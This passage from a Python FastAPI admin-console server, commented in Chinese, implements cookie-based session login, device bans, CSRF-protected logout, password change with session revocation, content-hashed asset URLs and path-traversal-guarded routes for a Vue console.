    # localStorage —— 那正是事故中令牌被 XSS 读走的原因。现在浏览器侧
    # 唯一的有效副本是 HttpOnly Cookie，`document.cookie` 读不到，
    # XSS 再复发也拿不走凭证。
    device_id, new_device = _ensure_device_id(request)

    # 拉黑的设备连登录都不给（放在签发之前：黑名单里的机器拿不到会话行）
    _ban_db = SessionLocal()
    try:
        ban = session_store.banned_for(
            _ban_db, bind_hash=session_store.bind_digest(device_id),
            fp=str(fingerprint or ""))
    finally:
        _ban_db.close()
    if ban is not None:
        logger.warning("被拉黑的设备尝试登录 ip=%s label=%s", ip, ban.label or "-")
        raise HTTPException(
            status_code=403,
            detail="该设备已被禁止登录，请在「登录设备」里解除或换一台设备")

    token, session_row = _issue_admin_session(
        request, ip=ip, fingerprint=fingerprint, device_id=device_id)
    if new_device:
        # 新设备首次登录：值得留痕（被盗密码时第一条线索就在这里）。
        logger.warning("后台新设备登录成功 ip=%s ua=%s sid=%s", ip,
                       (request.headers.get("user-agent", "") if request else "")[:120],
                       session_row.sid[:8])

    response = JSONResponse({
        "ok": True,
        "expires_in": settings.JWT_EXPIRE_HOURS * 3600,
        # 会话标识只用于排障与「当前设备」展示，不是凭证。
        "sid": session_row.sid[:8],
        # 多设备模式：明确告诉前端「当前在线设备数」，方便它提示
        "multi_device": not settings.SESSION_SINGLE,
    })
    _attach_auth_cookies(response, request, token, device_id, new_device, rotate_csrf=True)
    return response


def _ensure_device_id(request: Request) -> tuple[str, bool]:
    """取设备标识 Cookie；没有就生成一枚。返回 (device_id, 是否新建)。"""
    did = (request.cookies.get(session_store.DEVICE_COOKIE) or "").strip()
    if len(did) >= 16:
        return did, False
    return session_store.new_device_id(), True


def _issue_admin_session(request: Request, *, ip: str, fingerprint: str | None,
                         device_id: str):
    """签发一条新会话。

    多设备策略（2026-11-10）：
      * `SESSION_SINGLE=1` 时仍踢掉旧会话（显式开启才这样）；
      * 默认**允许多设备同时在线**，只受 `SESSION_MAX_DEVICES` 上限约束；
      * 设备被拉黑时直接拒绝登录（`banned_for` 在校验密码之前就查）。
    """
    ttl = settings.JWT_EXPIRE_HOURS * 3600
    sid = session_store.new_sid()
    token = create_admin_token(sid)
    db = SessionLocal()
    try:
        row = session_store.create_session(
            db,
            sid=sid,
            subject=settings.ADMIN_USERNAME,
            token=token,
            ip=ip,
            user_agent=request.headers.get("user-agent", "") if request else "",
            fingerprint=fingerprint or "",
            device_id=device_id if settings.SESSION_BIND_DEVICE else "",
            ttl_seconds=ttl,
            single=settings.SESSION_SINGLE,
            # 多设备模式下的上限；0 表示不限
            max_devices=(0 if settings.SESSION_SINGLE
                         else max(0, int(getattr(settings, "SESSION_MAX_DEVICES", 0) or 0))),
        )
    finally:
        db.close()
    return token, row


def _attach_auth_cookies(response, request: Request, token: str,
                         device_id: str, new_device: bool,
                         rotate_csrf: bool = False) -> None:
    """统一下发三枚 Cookie：会话（HttpOnly）、设备（HttpOnly）、CSRF（可读）。

    * 会话 Cookie：真正的凭证。`SameSite=Lax` —— 从外部链接点进 `/admin`
      这种顶层导航要能带上，`Strict` 会让"从收藏夹/文档点过来"变成未登录。
    * 设备 Cookie：只做绑定，不承载权限；180 天，让"同一台浏览器"可识别。
    * CSRF Cookie：**必须**允许 JS 读（双提交模式），`SameSite=Strict`。
    """
    https = _is_https(request)
    max_age = settings.JWT_EXPIRE_HOURS * 3600
    response.set_cookie(
        key=session_store.SESSION_COOKIE, value=token, httponly=True,
        samesite="lax", secure=https, path="/", max_age=max_age)
    if new_device:
        response.set_cookie(
            key=session_store.DEVICE_COOKIE, value=device_id, httponly=True,
            samesite="lax", secure=https, path="/",
            max_age=max(86400, settings.DEVICE_COOKIE_DAYS * 86400))
    # 登录时轮换（2026-11-24 第 3 轮，安全 P3 / S-8b）：原来沿用浏览器里已有的
    # wb_csrf，同一个值跨会话一直有效（登录前被种下 / 被看到的值登录后照样能用）。
    # 续期（/api/login/session）不轮换：前端每次请求现读 Cookie，轮换也不会坏，
    # 但多标签页并发请求时少一次竞态。
    existing = request.cookies.get(session_store.CSRF_COOKIE) or ""
    csrf = session_store.new_csrf_token() if (rotate_csrf or not existing) else existing
    response.set_cookie(
        key=session_store.CSRF_COOKIE, value=csrf, httponly=False,
        samesite="strict", secure=https, path="/", max_age=max_age)


def _clear_auth_cookies(response) -> None:
    for name in (session_store.SESSION_COOKIE, session_store.CSRF_COOKIE):
        response.delete_cookie(name, path="/")


def _revoke_current_session(request: Request) -> bool:
    """销毁这个请求所持凭证对应的会话行。返回是否真的吊销了一条。"""
    token = (request.cookies.get(session_store.SESSION_COOKIE)
             or request.headers.get("X-Admin-Token") or "")
    if not token:
        return False
    db = SessionLocal()
    try:
        return session_store.revoke_by_token(db, token, "logout")
    except Exception:  # noqa: BLE001 - 退出必须幂等，不能因为库抖动卡住用户
        logger.exception("退出登录时吊销会话失败")
        return False
    finally:
        db.close()


def same_origin_verdict(sec_fetch_site: str, origin: str, referer: str, host: str):
    """请求是否来自本站（纯函数）：True = 同源/用户直接输入，False = 跨站，None = 判不出。

    优先 `Sec-Fetch-Site`（现代浏览器都会发，脚本改不了）；没有时看 Origin，
    再看 Referer 的 host 是否等于 Host 头。
    """
    from urllib.parse import urlsplit

    site = str(sec_fetch_site or "").strip().lower()
    if site:
        return site in ("same-origin", "none")
    want = str(host or "").strip().lower()
    for value in (origin, referer):
        text = str(value or "").strip()
        if not text or text == "null":
            if text == "null":
                return False
            continue
        try:
            got = (urlsplit(text).netloc or "").lower()
        except ValueError:
            return False
        return bool(want) and got == want
    return None


def _request_same_origin(request: Request):
    return same_origin_verdict(request.headers.get("sec-fetch-site") or "",
                               request.headers.get("origin") or "",
                               request.headers.get("referer") or "",
                               request.headers.get("host") or "")


def _logout_allowed(request: Request) -> bool:
    """POST 退出的 CSRF 判定（2026-11-24 第 3 轮，S-8d）。

    带 CSRF 头且匹配 → 放行（前端 http.ts 自动补）；否则只要求「不是跨站」：
    确认页的表单提交是同源的。没有会话 Cookie 的请求本来就没什么可退，放行。
    """
    from admin.security import csrf_ok

    if not request.cookies.get(session_store.SESSION_COOKIE):
        return True
    if not getattr(settings, "CSRF_ENABLED", True) or csrf_ok(request):
        return True
    return _request_same_origin(request) is not False


def _logout_response(request: Request, as_redirect: bool):
    revoked = _revoke_current_session(request)
    logger.info("后台退出登录 revoked=%s", revoked)
    if as_redirect:
        response = RedirectResponse(url="/admin", status_code=303)
    else:
        response = JSONResponse({"ok": True, "revoked": revoked})
    _clear_auth_cookies(response)
    return response


@app.post("/api/login/logout")
@app.post("/outlogin")
def login_logout(request: Request):
    """**真实退出**：服务端销毁会话行，再清 Cookie。

    与升级前的区别：原来只 `delete_cookie`，JWT 依旧有效 —— 谁在那之前
    复制过 Cookie，退出之后照样能用到过期。现在 `revoked_at` 一落库，
    同一张令牌在任何设备上都立刻失效。

    2026-11-24：跨站且没带 CSRF 头的退出请求一律 403（登出型 CSRF）。
    表单提交（确认页）退出后 303 回 /admin，fetch 调用仍回 JSON。
    """
    if not _logout_allowed(request):
        return JSONResponse(status_code=403, content={"detail": "请求校验失败，请刷新页面后重试"})
    ctype = (request.headers.get("content-type") or "").lower()
    return _logout_response(request, ctype.startswith("application/x-www-form-urlencoded"))


_OUTLOGIN_CONFIRM_HTML = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>退出登录</title>
<style>body{font-family:system-ui,-apple-system,"Segoe UI",sans-serif;background:#f5f6f8;
display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.c{background:#fff;border-radius:12px;padding:28px 32px;box-shadow:0 4px 24px rgba(0,0,0,.08);
max-width:360px;text-align:center}button{margin-top:16px;padding:8px 20px;border:0;border-radius:8px;
background:#e5484d;color:#fff;font-size:14px;cursor:pointer}a{display:block;margin-top:12px;
color:#666;font-size:13px}</style></head><body><div class="c"><h3>确认退出登录？</h3>
<p style="color:#666;font-size:14px">这个退出链接来自其它页面，为防止被恶意链接踢下线，需要你确认一次。</p>
<form method="post" action="/outlogin"><button type="submit">退出登录</button></form>
<a href="/admin">返回控制台</a></div></body></html>"""


@app.get("/outlogin", include_in_schema=False)
def outlogin_page(request: Request):
    """浏览器地址栏直接访问的退出入口（GET 便于收藏/书签，旧链接兼容）。

    2026-11-24 第 3 轮（S-8d）：GET 会被跨站顶层导航带上 SameSite=Lax 的会话
    Cookie（`<a href>`、`location=`），原来直接吊销 = 登出型 CSRF。现在：
      * 用户在地址栏输入 / 书签 / 站内链接（Sec-Fetch-Site: none / same-origin，
        或 Referer 同 host）→ 行为不变，吊销并跳回登录页；
      * 其它情况（跨站或判不出）→ 返回确认页，点按钮以同源 POST 退出。
    """
    if _request_same_origin(request) is True or not request.cookies.get(session_store.SESSION_COOKIE):
        return _logout_response(request, True)
    return HTMLResponse(_OUTLOGIN_CONFIRM_HTML, headers={"Cache-Control": "no-store"})


@app.get("/api/login/session")
def login_session(request: Request, _: bool = Depends(require_admin)):
    """用有效令牌或会话 Cookie 换取/续期会话 Cookie（登录壳升级用）。"""
    token = request.headers.get("X-Admin-Token") or ""
    cookie_token = request.cookies.get(_ADMIN_COOKIE) or ""
    if cookie_token and token:
        try:
            verify_admin_token(token, request=request)
        except HTTPException:
            # require_admin may have accepted the newer cookie after an old
            # localStorage token failed; do not overwrite it with the stale one.
            token = cookie_token
    elif not token:
        token = cookie_token
    device_id, new_device = _ensure_device_id(request)
    response = JSONResponse({"ok": True})
    _attach_auth_cookies(response, request, token, device_id, new_device)
    return response


class PasswordChangeIn(BaseModel):
    old_password: str
    new_password: str


@app.patch("/api/admin/password")
def change_password(body: PasswordChangeIn, request: Request,
                    _: bool = Depends(require_admin)):
    if not verify_password(body.old_password, _get_stored_hash()):
        raise HTTPException(status_code=403, detail="当前密码不正确")
    if len(body.new_password) < 6:
        raise HTTPException(status_code=400, detail="新密码长度不能少于 6 位")
    revoked = 0
    db = SessionLocal()
    try:
        row = db.query(SystemSetting).filter(SystemSetting.key == "admin_password").first()
        if row:
            row.value = hash_password(body.new_password)
        else:
            db.add(SystemSetting(key="admin_password", value=hash_password(body.new_password)))
        db.commit()
        # 改密意味着「此前所有凭证都视为可能已泄露」：吊销全部会话，
        # 只留当前这一条（否则用户改完密码自己也被踢出去，体验很怪）。
        try:
            from admin.security import decode_admin_token
            current = request.cookies.get(session_store.SESSION_COOKIE) or ""
            sid = decode_admin_token(current).get("sid") if current else None
        except Exception:  # noqa: BLE001
            sid = None
        revoked = session_store.revoke_all(
            db, settings.ADMIN_USERNAME or "", "password_changed", except_sid=sid)
        logger.warning("后台密码已修改，吊销其它会话 %d 条", revoked)
    finally:
        db.close()
    # 只提示不拦截（拦截会改变现有前端行为）；前端可据此给出「密码偏弱」提示。
    weak = password_weakness(body.new_password, settings.ADMIN_USERNAME or "")
    if weak:
        logger.warning("新设置的后台密码偏弱：%s", "、".join(weak))
    global _weak_password_warned
    _weak_password_warned = True
    return {"ok": True, "revoked_sessions": revoked, "weak_reasons": weak}


@app.get("/")
def index_redirect():
    return RedirectResponse(url="/admin")


CONSOLE_DIR = Path(__file__).resolve().parent / "console"
#: 会话 Cookie 名。控制台本体在 admin/console/（**不经** /static 暴露），
#: 只有携带有效会话 Cookie 的请求才能拿到 —— 未登录的访客只会看到
#: static/login.html 这个中性壳页，HTML 源码里不再出现任何产品与内部实现信息。
_ADMIN_COOKIE = "admin_session"


def _local_runtime() -> bool:
    """本机客户端运行时。**生产恒 False**（见 admin/env_guard.py）。

    升级前这里是直接读 `WORKBUDDY_DESKTOP` / `WORKBUDDY_ANDROID` 环境变量，
    而 `_console_allowed()` 在命中时**不做任何 Cookie/JWT 校验**就直接下发
    完整控制台。生产 `.env` 只要误带一个变量（从本地配置整体拷过来很常见），
    `/admin` 与 `/admin/assets/*` 就整体裸奔 —— 这是事故报告里 R2。
    """
    return env_guard.local_runtime()


def _is_https(request: Request) -> bool:
    if request.url.scheme == "https":
        return True
    # X-Forwarded-Proto 只采信可信代理发来的（安全审查 S-8c）。
    if (request.headers.get("x-forwarded-proto") or "").lower() != "https":
        return False
    try:
        from admin.client_ip import is_trusted_proxy
        return is_trusted_proxy(request.client.host if request.client else "")
    except Exception:  # noqa: BLE001
        return False


def _console_allowed(request: Request) -> bool:
    """是否向该请求下发完整控制台：本地运行时，或带有效会话 Cookie。"""
    if _local_runtime():
        return True
    from admin.security import verify_admin_token
    try:
        verify_admin_token(request.cookies.get(_ADMIN_COOKIE), request=request,
                           require_bind=settings.SESSION_BIND_DEVICE)
        return True
    except Exception:
        return False


def _admin_cookie_params(request: Request, max_age: int):
    """保留给旧调用点：会话 Cookie 的参数（设备/CSRF Cookie 见 _attach_auth_cookies）。"""
    https = _is_https(request)
    return dict(key=_ADMIN_COOKIE, httponly=True, samesite="lax",
                secure=https, path="/", max_age=max_age)


def _console_mode(request: Request | None = None) -> str:
    """本次请求使用哪套控制台：v1（旧）或 v2（新版）。

    优先级：`?ui=v1` 显式回退 > `MIRAIHUB_CONSOLE` 环境变量 > 默认 v1。
    非法值一律按 v1 处理，避免写错一个字符就把后台切没。

    `request` 允许缺省 / 是测试替身：`query_params` 取不到时按「没有显式回退」
    处理。历史上这里硬解 `request.query_params`，`_FakeRequest` 那种替身直接
    AttributeError（test_console_boot 的两条 error 就是这么来的）。
    """
    params = getattr(request, "query_params", None) or {}
    try:
        forced = (params.get("ui") or "").strip().lower()
    except AttributeError:  # 不是 Mapping：当成没有 ui 参数
        forced = ""
    if forced == "v1":
        return "v1"
    mode = (os.environ.get("MIRAIHUB_CONSOLE") or "v1").strip().lower()
    return mode if mode in ("v1", "v2") else "v1"


@app.get("/admin")
@app.get("/admin/")
def admin_index(request: Request):
    """登录门禁：有会话 Cookie → 完整控制台；否则只给中性登录壳。

    S30 切换：MIRAIHUB_CONSOLE=v2 且 admin/ui/dist/index.html 存在时，
    已登录 → 302 到 /admin/v2/；未登录 → 发新版 login.html（缺失则回退旧登录页）。
    ?ui=v1 可临时回退旧版；默认仍是 v1，行为与切换前一致。
    """
    mode = _console_mode(request)
    ui_index = UI_DIST / "index.html"
    if mode == "v2" and ui_index.is_file():
        if _console_allowed(request):
            return RedirectResponse(url="/admin/v2/", status_code=302,
                                    headers={"Cache-Control": "no-store"})
        ui_login = UI_DIST / "login.html"
        if ui_login.is_file():
            return FileResponse(ui_login, headers={
                "Cache-Control": "no-store, no-cache, must-revalidate",
                "Content-Security-Policy": _ADMIN_CSP,
            })
        # 新版登录页缺失时继续走下面的旧登录页，绝不把后台切成 404。
    if _console_allowed(request):
        index = CONSOLE_DIR / "index.html"
        # 兼容旧打包布局（控制台仍在 static/ 的桌面/移动端产物）。
        if not index.is_file() and (STATIC_DIR / "index.html").is_file():
            return HTMLResponse(_console_shell(STATIC_DIR / "index.html"),
                                headers={"Cache-Control": "no-store, no-cache, must-revalidate"})
        return HTMLResponse(_console_shell(index),
                            headers={"Cache-Control": "no-store, no-cache, must-revalidate"})
    # 登录页本身不引用任何外部资源（脚本全内联），没有 `?v=` 可打，
    # 继续用 FileResponse 发原文件即可。
    return FileResponse(STATIC_DIR / "login.html",
                        headers={"Cache-Control": "no-store, no-cache, must-revalidate"})


def _stamped_page(path) -> str:
    """读一个小页面并把资源 `?v=` 换成内容哈希（注册页用）。

    注册页直接引用 `/static/phone-session.js` 与 `phone-region.css`，
    而且**原本一个版本号都没写** —— 换了内容照样被浏览器缓存。
    文件只有几十 KB，每次读一遍不值得做缓存。
    """
    try:
        return stamp_asset_urls(_read_console_html(path))
    except OSError:
        return ""


#: 控制台 HTML 的内存缓存：键为 (绝对路径, mtime, 大小)。
#: 每次请求都读 500KB 文件再拼字符串是纯浪费，而这份文件在进程生命周期内
#: 基本不变（升级会重启进程）。
#: 注意缓存的是**原始** HTML：资源 `?v=` 每次下发时按当前内容重新盖章
#: （见 stamp_asset_urls），所以改了 js/css 不必重启、也不必清这个缓存。
_CONSOLE_SHELL_CACHE: dict = {}


# ---------------------------------------------------------------------------
# 资源版本号：**按内容自动算**，不再手工改 `?v=`
# ---------------------------------------------------------------------------
#
# 以前每个静态资源（console-app.js / console.css / 各面板脚本）的 URL 上都写死
# 一个 `?v=20261105-ui9` 之类的串，改完代码要**记得**手工加版本，忘了就是
# 「改了没生效，用户看到的是缓存里的旧文件」，而且一次改动往往要连改
# index.html 里十几处、还得跟打包脚本对齐。
#
# 现在统一由服务端在**下发 HTML 时**把 `/admin/assets/*` 与 `/static/*` 的
# `?v=` 换成该文件内容的哈希前 10 位：
#   · 内容不变 → URL 不变 → 浏览器缓存继续命中（不会每次刷新都重下）；
#   · 内容变了 → URL 变了 → 立刻失效，**不可能忘**；
#   · 打包/源码/dev 三种情况走同一条代码路径，不需要 build 里再插一步。
#
# 代价：每个资源**第一次**被引用时读一遍算哈希（console-app.js 780KB ≈ 2ms），
# 之后按 (mtime_ns, size) 命中缓存 —— 只有文件真的变了才重算。
# 内容哈希的 URL 天生可以长缓存，所以这里按「一个文件」算，不做全目录扫描。
#: 绝对路径 → (mtime_ns, size, 内容哈希前 10 位)
_ASSET_DIGEST_CACHE: dict = {}
#: URL 路径 → 磁盘文件。`Path.resolve()` 在 Windows 上要问文件系统，
#: 一屏 40 个资源引用点每个都 resolve 两次就是几十毫秒 —— 缓存住。
_ASSET_PATH_CACHE: dict = {}
_ASSET_REF_RE = None         # 懒编译


def _asset_roots() -> list:
    """参与版本化的资源根目录：`/admin/assets/` 与 `/static/`。"""
    return [("/admin/assets/", CONSOLE_DIR), ("/static/", STATIC_DIR)]


def _asset_file_of(url_path: str):
    """URL 路径 → 磁盘文件（越界或不存在返回 None）。

    只认 `/admin/assets/...` 与 `/static/...`；`/admin`、`/join` 这类页面路由
    原样返回 None，因此不会被误加 `?v=`。
    """
    if url_path in _ASSET_PATH_CACHE:
        return _ASSET_PATH_CACHE[url_path]
    resolved = None
    for prefix, root in _asset_roots():
        if not url_path.startswith(prefix):
            continue
        relative = url_path[len(prefix):]
        if not relative or relative.endswith("/"):
            break
        try:
            base = root.resolve()
            target = (base / relative).resolve()
        except OSError:
            break
        if target != base and not str(target).startswith(str(base) + os.sep):
            break            # `../` 穿越，绝不返回
        if target.is_file():
            resolved = target
        break
    _ASSET_PATH_CACHE[url_path] = resolved
    return resolved


def _hash_file(path: Path) -> str:
    digest = hashlib.sha1()
    try:
        with open(path, "rb") as handle:
            for chunk in iter(lambda: handle.read(262144), b""):
                digest.update(chunk)
    except OSError:
        # 读不到（并发删 / 权限）就退回时间戳，至少 URL 还能区分新旧
        try:
            return "t%x" % int(path.stat().st_mtime)
        except OSError:
            return ""
    return digest.hexdigest()[:10]


def asset_digest(path) -> str:
    """单个资源文件的内容哈希（带 (mtime, size) 缓存）。

    文件内容一变就换 URL —— 这就是「再也不用记着手改 `?v=`」的全部机制。
    """
    try:
        path = Path(path)
        stat = path.stat()
    except OSError:
        return ""
    cached = _ASSET_DIGEST_CACHE.get(str(path))
    if cached and cached[0] == stat.st_mtime_ns and cached[1] == stat.st_size:
        return cached[2]
    digest = _hash_file(path)
    _ASSET_DIGEST_CACHE[str(path)] = (stat.st_mtime_ns, stat.st_size, digest)
    return digest


def _asset_version_of(url_path: str) -> str:
    target = _asset_file_of(url_path)
    return asset_digest(target) if target is not None else ""


def stamp_asset_urls(html: str) -> str:
    """把 HTML 里 `/admin/assets/*` 与 `/static/*` 的 `?v=` 换成内容哈希。

    只动 `src=` / `href=` 的属性值，且只动以 `/` 开头的同源路径 ——
    外链、`data:`、`#anchor`、页面路由（`/admin`、`/join`）一律原样。
    """
    import re as _re

    global _ASSET_REF_RE
    if _ASSET_REF_RE is None:
        _ASSET_REF_RE = _re.compile(r'\b(src|href)="(/[^"]*)"')
    pattern = _ASSET_REF_RE

    def replace(match):
        attr, url = match.group(1), match.group(2)
        core = url.split("#", 1)[0].split("?", 1)[0]
        version = _asset_version_of(core)
        if not version:
            return match.group(0)
        return '%s="%s?v=%s"' % (attr, core, version)

    return pattern.sub(replace, html)


def _console_shell(path) -> str:
    """把「已登录」状态直接写进首屏 HTML，避免刷新时闪一下登录卡片。

    为什么要在服务端做：`/admin` 这个入口本来就已经用会话 Cookie 判定过
    「这个请求该不该拿到控制台」——判定结果就在眼前，却要等浏览器下载完
    500KB 的 index.html、再跑一段 JS 请求 `/api/accounts` 才知道该显示哪个
    界面。中间这段时间里 `#login` 是可见的，表现就是「刷新后先出现
    登录页、过一会儿才变成后台」。

    这里把结论直接注入成 `<html class="console-authed">`，配合 index.html
    里的 `html.console-authed #login{display:none!important}`，登录卡片在
    首帧就不会被绘制。JS 仍会在 Cookie/token 都失效时把它显示回来，
    因此没有 JS 或会话过期时行为与原来一致。
    """
    stat = path.stat()
    # 缓存的是**原始** HTML（读盘 + 完整性校验最贵）；盖章放在缓存之外，
    # 这样改了 js/css 不用重启进程、也不用等缓存过期。
    key = (str(path), stat.st_mtime_ns, stat.st_size)
    html = _CONSOLE_SHELL_CACHE.get(key)
    if html is None:
        html = _read_console_html(path)
        if _console_html_complete(html):
            _CONSOLE_SHELL_CACHE.clear()
            _CONSOLE_SHELL_CACHE[key] = html
    # 静态资源的 `?v=` 由服务端注入内容哈希 —— HTML 里留着的历史版本号会被覆盖
    html = stamp_asset_urls(html)
    marker = 'lang="zh-CN"'
    if marker in html:
        html = html.replace(marker, marker + ' class="console-authed"', 1)
    elif "<html" in html:
        html = html.replace("<html", '<html class="console-authed"', 1)
    return html


def _console_html_complete(html: str) -> bool:
    return html.rstrip().endswith("</html>")


def _read_console_html(path) -> str:
    """读控制台 HTML，保证读到的是**完整**文件。

    为什么需要：`index.html` 有 800KB、近 1.5 万行，编辑/升级的瞬间文件会先被
    截断再写入。恰好在这个窗口里刷新页面，读到的就是半截 HTML —— 浏览器会把
    最后一个 `<script>` 一直解析到文件结尾，报
    `Uncaught SyntaxError: Unexpected end of input`，于是所有 `onclick` 都绑不上，
    界面上表现为「扫描/导入/导出/账号池的按钮点了全都没反应」，而控制台里那条
    报错完全看不出跟「文件没写完」有关。这里读到不完整就稍等重读，宁可慢一点
    也不能把半截页面发出去。
    """
    html = ""
    for _ in range(4):
        before = path.stat()
        html = path.read_text(encoding="utf-8")
        after = path.stat()
        stable = (before.st_mtime_ns == after.st_mtime_ns and before.st_size == after.st_size)
        if stable and _console_html_complete(html):
            return html
        time.sleep(0.05)
    return html



@app.get("/admin/assets/{file_path:path}")
def console_asset(file_path: str, request: Request):
    """控制台私有静态资源（admin/console/*）。无会话一律 404，不暴露存在性。

    缓存策略跟着 `?v=` 走（版本号由 `stamp_asset_urls()` 注入内容哈希）：

      * URL 里的版本 == 当前文件哈希 → `immutable`，一年有效。
        这个 URL 天生是内容寻址的，文件一变 URL 就变，长缓存不会拿到旧内容。
      * 否则（无 version / 手写的旧版本号）→ `no-cache`，每次用 ETag 校验。
        宁可多一个 304，也不让「改完没生效」再发生一次。
    """
    if not _console_allowed(request):
        raise HTTPException(status_code=404)
    root = CONSOLE_DIR.resolve()
    target = (root / file_path).resolve()
    if not str(target).startswith(str(root) + os.sep) or not target.is_file():
        raise HTTPException(status_code=404)
    current = asset_digest(target)
    supplied = request.query_params.get("v") or ""
    if current and supplied == current:
        headers = {"Cache-Control": "public, max-age=31536000, immutable"}
    else:
        headers = {"Cache-Control": "no-cache"}
    return FileResponse(target, headers=headers)


class UIStaticGZipMiddleware:
    """只给 /admin/v2 的静态资源开 gzip。

    为什么不全局：`/v1`、`/gw` 的 SSE 长连接一旦被 gzip 缓冲，token 会被攒住，
    流式体验直接坏掉。这里按路径分流，API/SSE 原样直通。
    """

    def __init__(self, app):
        self.app = app
        self.gzip = GZipMiddleware(app, minimum_size=1024, compresslevel=6)

    async def __call__(self, scope, receive, send):
        if scope.get("type") == "http" and scope.get("path", "").startswith("/admin/v2/"):
            await self.gzip(scope, receive, send)
        else:
            await self.app(scope, receive, send)


# ⚠️ 必须**追加到栈尾**（最内层），不能用 `add_middleware`。
#
# `add_middleware` 是 `user_middleware.insert(0, ...)` —— 后添加的会在**最外层**。
# 本文件末尾才定义这个类，直接 `add_middleware` 就会把 `AbuseGuardMiddleware`
# （封禁守卫，必须最外层、不分路径）挤到第二层，`test_graceful_lifecycle` 的
# «最外层必须仍是不分路径的封禁守卫» 会挂。而这个 gzip 只对 `/admin/v2/`
# 静态资源生效，放在最内层语义完全等价。
from starlette.middleware import Middleware as _StarletteMiddleware

app.user_middleware.append(_StarletteMiddleware(UIStaticGZipMiddleware))


# 新版控制台（Vue 3 + Vite 构建产物）—— `/admin/v2`
# ---------------------------------------------------------------------------
#
# 与旧版**并行**：`/admin` 与 `/admin/assets/*` 继续由 admin_index /
# console_asset 服务（admin/console/ 下是手写 JS，改一次要全量自测），
# 新版只读 `admin/ui/dist`，源码在 `admin/ui`（`npm run build` 产出）。
# 好处是切换只影响这两条路由，旧版随时可以回退，见 docs/ui-v2/README.md。
UI_DIST = Path(__file__).resolve().parent / "ui" / "dist"

#: 入口 HTML（含 SPA 回退）的响应头：**一律不缓存**。
#:
#: 新版把 JS/CSS 换成了内容哈希文件名，但入口 HTML 里引用的是**构建时**
#: 写死的那几个哈希；一旦发版，浏览器缓存里的旧 index.html 指向的 chunk
#: 已经被删，用户看到的是白屏 + 一堆 404。所以 HTML 必须每次回源校验。
_UI_V2_HTML_HEADERS = {
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Content-Security-Policy": _ADMIN_CSP,
}

#: `assets/` 下的文件名自带内容哈希（Vite 生成），改一个字节文件名就变，
#: 于是可以放心长缓存一年：不存在「改完没生效」的可能。
_UI_V2_ASSET_HEADERS = {
    "Cache-Control": "public, max-age=31536000, immutable",
}


def _log_ui_v2_missing() -> None:
    """新版构建缺失时的统一日志。

    没有这一条，运维看到的只是一个 404 —— 分不清是「路由没挂」「没登录」
    还是「部署包漏了 dist 目录」。这里把话说明白，并给出补救命令。
    """
    logger.warning("新版控制台未构建：%s 不存在（在 admin/ui 下执行 npm run build）",
                   UI_DIST / "index.html")


@app.get("/admin/v2")
@app.get("/admin/v2/")
def ui_v2_index(request: Request):
    """新版控制台入口：有会话 → 发 `admin/ui/dist/index.html`。

    未通过 `_console_allowed()` 时**不**在这里发登录页，而是 303 回旧版
    `/admin`：登录页只有一份（admin/static/login.html），两张皮迟早会漂移。
    `/admin` 自己的门禁不变，跳转不会放宽任何东西。
    """
    if not _console_allowed(request):
        return RedirectResponse(url="/admin", status_code=303)
    index = UI_DIST / "index.html"
    if not index.is_file():
        _log_ui_v2_missing()
        raise HTTPException(status_code=404)
    return FileResponse(index, headers=dict(_UI_V2_HTML_HEADERS))


@app.get("/admin/v2/{file_path:path}")
def ui_v2_asset(file_path: str, request: Request):
    """新版控制台的静态资源 + SPA 回退。

    与 `console_asset` 对齐的两条：

      * **未登录一律 404**，不告诉探测者「文件存在，只是你没权限」；
      * 路径穿越用同样的 `resolve()` + 前缀校验挡掉（`../server.py` 之类），
        且越界直接 404，不参与后面的 SPA 回退。

    额外一条是缓存分层：`assets/` 下是 Vite 的**内容哈希**产物 → immutable
    长缓存；其余（`login.html` 等）→ `no-cache`，每次用 ETag 校验。

    前端用的是 hash 路由（`/admin/v2/#/accounts`），正常不会把深链打到服务端；
    但 `login.html` 是独立入口，未来也可能改成 history 模式，所以非
    `assets/` 的未知路径统一回入口页，不让刷新直接吃 404。
    """
    # 登录页本身是公开入口：它引用的 JS/CSS 必须能在未登录时加载，
    # 否则 /admin 发出去的 login.html 会白屏（浏览器报一堆 assets 404）。
    # 只放行 assets/ 与 login.html；入口 HTML、SPA 深链、其他文件继续要求会话。
    public_entry = file_path.replace("\\", "/") == "login.html"
    is_asset = file_path.replace("\\", "/").startswith("assets/")
    # The public join entry shares platform logos and the site icon with the console.
    normalized_path = file_path.replace("\\", "/")
    public_image = normalized_path == "favicon.svg" or (
        normalized_path.startswith("logos/")
        and Path(normalized_path).suffix.lower() in {".svg", ".png", ".webp", ".jpg", ".jpeg", ".avif"}
    )
    if not _console_allowed(request) and not (is_asset or public_entry or public_image):
        raise HTTPException(status_code=404)
    root = UI_DIST.resolve()
    try:
        target = (root / file_path).resolve()
    except OSError:
        raise HTTPException(status_code=404) from None
    escaped = not str(target).startswith(str(root) + os.sep)
    if escaped or not target.is_file():
        # 资源缺失就是「构建不完整」，直说 404 比给一个入口页更好排查。
        if is_asset or public_image:
            raise HTTPException(status_code=404)
        if escaped:
            # 穿越到 dist 之外：不回退，避免把任意路径都伪装成 200。
            raise HTTPException(status_code=404)
        index = root / "index.html"
        if not index.is_file():
            _log_ui_v2_missing()
            raise HTTPException(status_code=404)
        return FileResponse(index, headers=dict(_UI_V2_HTML_HEADERS))
    headers = (dict(_UI_V2_ASSET_HEADERS) if is_asset
               else {"Cache-Control": "no-cache"})
    return FileResponse(target, headers=headers)


@app.get("/join")
@app.get("/join/")
@app.get("/static/join.html")
def join_index(request: Request, db: Session = Depends(get_db)):
    """Vue public account entry; access remains controlled by the join gate middleware."""
    target = UI_DIST / "join.html"
    if not target.is_file():
        _log_ui_v2_missing()
        raise HTTPException(status_code=404)
    return FileResponse(target, headers={
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Content-Security-Policy": _ADMIN_CSP,
    })


#: 票据引导页。**这是整个 join 链路里唯一不设门禁的页面**。
#:
#: 为什么需要它：票据放在 `#fragment` 里，而 fragment **不会发给服务器** ——
#: 如果 `/join` 本身要求 Cookie，用户点链接会先吃一个 404，页面根本加载不出来，
#: 也就没有机会去兑换票据。这个页只做一件事：读 hash → 换 Cookie → 跳 `/join`。
#:
#: 它不含任何业务信息（连产品名都没有），未通过验证时只是一句"链接已失效"。
_JOIN_BOOTSTRAP_HTML = """<!DOCTYPE html>
<html lang="zh-CN"><head>
